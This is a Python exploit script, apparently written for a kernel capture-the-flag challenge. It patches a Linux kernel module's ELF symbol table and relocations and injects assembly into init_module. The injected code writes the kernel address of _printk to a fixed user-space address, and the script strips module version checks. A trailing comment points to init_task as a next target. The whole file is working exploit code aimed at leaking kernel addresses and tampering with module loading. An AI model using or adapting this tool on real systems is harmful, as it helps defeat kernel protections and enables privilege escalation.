from pwnc.minelf import *
from pwn import context, asm
from ctypes import sizeof
import argparse

parser = argparse.ArgumentParser("patch")
parser.add_argument("file")
args = parser.parse_args()

SHT_RELA = 4
R_X86_64_64 = 1
context.arch = "amd64"

raw_elf_bytes = open(args.file, "rb").read()
elf = ELF(raw_elf_bytes)

symbols_section = elf.section_from_name(b".symtab")
symbols = elf.section_content(symbols_section, elf.Symbol)
symbol_names_section = elf.section_from_name(b".strtab")
symbol_names = elf.section_content(symbol_names_section)

def symbol_name(sym: ELF.Symbol):
    return elf.cstr(symbol_names_section.offset + sym.name).tobytes()

def find_symbol(name: bytes):
    for symbol in symbols:
        if name == symbol_name(symbol):
            return symbol
        
def find_init_module_rela(init_module: ELF.Symbol):
    for i, section in enumerate(elf.sections):
        if section.type == SHT_RELA and section.info == init_module.section_index:
            return section

needed = {}
this_module_rela = elf.section_content(elf.section_from_name(b".rela.gnu.linkonce.this_module"), elf.Reloca)
for rela in this_module_rela:
    sym = symbols[rela.sym]
    needed[symbol_name(sym)] = elf.Symbol.from_buffer_copy(sym)
        
symidx = 1
symname = 1
for i, (name, sym) in enumerate(needed.items()):
    print(this_module_rela[i].sym)
    this_module_rela[i].sym = symidx

    symbols[symidx].name = symname
    symbols[symidx].info = sym.info
    symbols[symidx].other = sym.other
    symbols[symidx].section_index = sym.section_index
    symbols[symidx].value = sym.value
    symbols[symidx].size = sym.size

    name += b"\x00"
    symbol_names[symname:symname+len(name)] = name

    symidx += 1
    symname += len(name) + 1

init_symbol = find_symbol(b"init_module")
init_section = elf.sections[init_symbol.section_index]
offset = init_section.offset + init_symbol.value
init_section_name = elf.section_name(elf.sections[init_symbol.section_index])
init_rela_section = find_init_module_rela(init_symbol)
init_rela = elf.section_content(init_rela_section, elf.Reloca)[0]
init_rela.addend = 0
init_rela.offset = 2 + init_symbol.value
init_rela.type = R_X86_64_64
init_rela.sym = symidx
init_rela_section.size = 1 * sizeof(elf.Reloca)
symbols[init_rela.sym].name = symname
symbols[init_rela.sym].info = 0x10
symbols[init_rela.sym].section_index = 0
new_name = b"_printk\0"
symbol_names[symname:symname+len(new_name)] = new_name

symidx += 1
symbols_section.size = symidx * sizeof(elf.Symbol)


patch = asm(
"""
    movabs rax, 0
    mov edi, 0x1337000
    mov qword ptr [rdi], rax
    ret
""", vma=offset)
elf.raw_elf_bytes[offset:offset + len(patch)] = patch

for section in elf.sections:
    name = elf.section_name(section).tobytes()
    if name.startswith(b".rela") and name not in [b".rela" + init_section_name, b".rela.gnu.linkonce.this_module"]:
        section.size = 0

    if name == b"__versions":
        section.flags = 0

with open("patch.ko", "wb+") as fp:
    fp.write(elf.raw_elf_bytes)

# useful exported symbols
# init_task